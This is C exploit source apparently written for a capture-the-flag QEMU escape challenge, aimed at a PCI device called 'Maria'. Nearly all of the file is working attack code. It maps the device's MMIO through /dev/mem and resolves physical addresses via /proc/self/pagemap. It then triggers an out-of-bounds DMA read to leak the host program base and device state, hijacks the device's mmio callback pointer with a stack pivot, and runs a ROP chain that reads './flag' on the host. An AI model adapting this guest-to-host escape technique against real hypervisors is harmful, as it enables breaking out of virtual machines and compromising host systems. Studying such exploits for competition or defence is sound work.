#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN ((1ull << 55) - 1)

#define DEV_PATH "/sys/devices/pci0000:00/0000:00:05.0/resource0"

int mem = -1, pagemap = -1;

uint64_t page_offset(uint64_t addr)
{
    return addr & (PAGE_SIZE - 1);
}

uint64_t gva2gfn(void *addr)
{
    uint64_t pme, gfn;
    off_t offset = (off_t)((uintptr_t)addr >> PAGE_SHIFT) * (off_t)sizeof(pme);
    ssize_t got = pread(pagemap, &pme, sizeof(pme), offset);
    if (got != (ssize_t)sizeof(pme))
    {
        return (uint64_t)-1;
    }

    if (!(pme & PFN_PRESENT))
    {
        return -1;
    }

    gfn = pme & PFN_PFN;
    return gfn;
}

uint64_t gva2gpa(void *addr)
{
    if (pagemap == -1)
    {
        pagemap = open("/proc/self/pagemap", O_RDONLY);

        if (pagemap == -1)
        {
            errExit("open pagemap file failed");
        }
    }

    uint64_t gfn = gva2gfn(addr);
    if (gfn == (uint64_t)-1)
    {
        return (uint64_t)-1;
    }
    return (gfn << PAGE_SHIFT) | page_offset((uintptr_t)addr);
}

uint8_t *map_phys_address(off_t address, size_t size)
{
    uint8_t *map;

    if (mem == -1)
    {
        mem = open("/dev/mem", O_RDWR | O_SYNC);
        if (mem == -1)
        {
            errExit("open /dev/mem failed");
        }
    }

    map = (uint8_t *)mmap(0, size, PROT_READ | PROT_WRITE, MAP_SHARED,
                          mem, address);
    return map;
}


void enable_bus_master_mode()
{
    uint8_t buf[1] = {0x7};

    int fd = open("/sys/devices/pci0000:00/0000:00:05.0/config", O_RDWR | O_SYNC);
    if (fd == -1)
    {
        errExit("open pci config space failed");
    }
    pwrite(fd, &buf, 1, 4);
    close(fd);
}

void hex_dump(char *buf, size_t size)
{
    for (size_t i = 0; i <= size / 8; i++)
    {
        printf("[+] buf[0x%04lx] -> 0x%016lx\n",
               i * 8,
               *(uint64_t *)&buf[i * 8]);
    }
}
#define U64_PTR(o) ((uint64_t *)&base[(o)])
#define U64_AT(o) (*U64_PTR(o))

uint8_t* mmio_mem;
void mmio_write(uint32_t addr, uint32_t value)
{
    *(uint32_t *)(mmio_mem + addr) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *(uint32_t *)(mmio_mem + addr);
}

void set_src(uint32_t value)
{
    mmio_write(0x04, value);
}

void set_off(uint32_t value)
{
    mmio_write(0x08, value);
}

void get_buf()
{
    mmio_read(0x00);
}

void set_buf()
{
    mmio_write(0x00, 0);
}

int main(void)
{
    mmio_mem = map_phys_address(0xfebd0000, PAGE_SIZE);
    if (mmio_mem == MAP_FAILED)
    {
        errExit("map mmio memory failed");
    }
    logInfo("MMIO memory mapped @ %p", mmio_mem);

    int fd = open(DEV_PATH, O_RDWR | O_SYNC);
    if (fd == -1)
    {
        errExit("open device resource failed");
    }

    system("sysctl -w vm.nr_hugepages=40");
    system("cat /proc/meminfo | grep -i huge");

    char *buf;
    uint64_t buf_gpa;

    for (;;)
    {
        buf = mmap(0, 4 * PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_NONBLOCK, -1, 0);
        if (buf == MAP_FAILED)
        {
            errExit("mmap");
        }

        memset(buf, 0, 2 * PAGE_SIZE);
        buf_gpa = gva2gpa(buf);
        uint64_t buf_gpa_1000 = gva2gpa(buf + PAGE_SIZE);
        if (buf_gpa_1000 == buf_gpa + PAGE_SIZE)
        {
            logOK("Found contiguous pages at gpa: %p", (void *)buf_gpa);
            break;
        }
    }

    logInfo("buf vma: %p", buf);
    logInfo("buf gpa: %p", (void *)buf_gpa);

    logInfo("Triggering OOB read to leak info...");

    set_src(buf_gpa);
    set_off(0xF0);
    get_buf(); // Out of bounds read

    uint64_t progbase = *(uint64_t *)(buf + (0x2000 - 0xf0) + 0x88) - 0x81dae0;
    logOK("Leaked progbase: %p", (void *)progbase);

    uint64_t MariaState = *(uint64_t *)(buf + (0x2000 - 0xf0) + 0x20);
    uint64_t opaque = MariaState;

    logOK("opaque: %p", (void *)opaque);
    logOK("Leaked MariaState: %p", (void *)MariaState);

    logInfo("Building ROP chain...");
    uint64_t xchg_edi_eax = progbase + 0x3584d5; /* xchg edi, eax ; ret */
    uint64_t xchg_edx_eax = progbase + 0x309c8a; /* xchg edx, eax ; ret */
    uint64_t pivot = progbase + 0xb1088a;        /* push rax ; pop rsp ; mov eax, 1 ; pop rbp ; ret */
    uint64_t pop_rdi = progbase + 0x632c5d;      /* pop rdi ; ret */
    uint64_t pop_rsi = progbase + 0x4d4db3;      /* pop rsi ; ret */
    uint64_t pop_rdx = progbase + 0x47f5c8;      /* pop rdx ; ret */
    uint64_t pop_rax = progbase + 0x3643a4;      /* pop rax ; ret */
    uint64_t syscall = progbase + 0x4a22ec;      /* syscall; add cl, cl; ret; */

    char *base = buf + (0x2000 - 0xf0);

    uint64_t idx = 0;
    uint64_t *rop = (uint64_t *)&base[-0x700];

    U64_AT(0x48) = ((MariaState + 0x2a30) - 0x800); /* replace maria->mmio */
    U64_AT(0x50) = ((MariaState + 0x2a30) - 0x700); /* ROP storage pointer */

    U64_AT(-0x800) = pivot; /* fake mmio write */
    U64_AT(-0x7f8) = pivot; /* fake mmio read  */

    /* store "./flag" for open() */
    strcpy(&base[-0x500], "./flag");

    rop[idx++] = 0xdeadbeef; // for pop rbp
    // open
    rop[idx++] = pop_rdi;
    rop[idx++] = ((MariaState + 0x2a30) - 0x500);
    rop[idx++] = pop_rsi;
    rop[idx++] = 0;
    rop[idx++] = pop_rax;
    rop[idx++] = 2;
    rop[idx++] = syscall;
    // read
    rop[idx++] = xchg_edi_eax;
    rop[idx++] = pop_rsi;
    rop[idx++] = ((MariaState + 0x2a30) - 0x400);
    rop[idx++] = pop_rdx;
    rop[idx++] = 0x100;
    rop[idx++] = pop_rax;
    rop[idx++] = 0;
    rop[idx++] = syscall;
    // write
    rop[idx++] = xchg_edx_eax;
    rop[idx++] = pop_rdi;
    rop[idx++] = 1;
    rop[idx++] = pop_rax;
    rop[idx++] = 1;
    rop[idx++] = syscall;
    // exit
    rop[idx++] = pop_rax;
    rop[idx++] = 60;
    rop[idx++] = syscall;

    logInfo("Triggering ROP chain...");
    set_buf();
    set_off(0x0); // trigger

    logInfo("Cleaning up...");
    munmap(mmio_mem, PAGE_SIZE * 4);
    close(fd);

    return 0;
}
